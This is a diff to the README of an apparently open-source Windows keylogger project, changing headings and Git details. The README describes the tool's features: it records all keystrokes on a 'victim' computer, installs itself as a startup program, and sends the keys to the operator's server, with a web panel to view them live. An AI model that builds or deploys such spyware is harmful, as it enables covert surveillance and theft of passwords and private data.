@@ -3,12 +3,12 @@ Open source project, Create a keylogger to operate at windows. and Manage Wireta
 
 # What is this ?
 
-* Make KeyLogger
+* KeyLogger
   * Saves all values entered by the user to the victim's local computer.
   * Register as Startup Program.
   * Send key your server.
     * Use to referer
-* web for keyLogger
+* web 
   * Back-end
     * Checking the real-time key value
     * Save real-time transmitted keys
@@ -16,11 +16,12 @@ Open source project, Create a keylogger to operate at windows. and Manage Wireta
   * Front-end
     * view page PC or Mobile
    
-# Fork Info
+# Git info
+### Fork 
 `https://gist.github.com/pmsosa/41f1f049c8b63d4168501d40ec53b639` </br>
 gist !</br>
 
-# branch or merge
+### branch or merge
 10 branch, (practice branch 5, final for merge branch 4, master)</br>
 5 merge (merge_final, merge_intadd, merge_startprogram, merge_mij992900, master)</br>
 
@@ -108,5 +109,3 @@ browser open `http://yourserver/4500/05f7a6edc6d63e4f97353f87fbb3d18d.php`</br>
 <p align="left">
   <img width="760" height="400" src="./img/4500.PNG">
 </p>
-
-
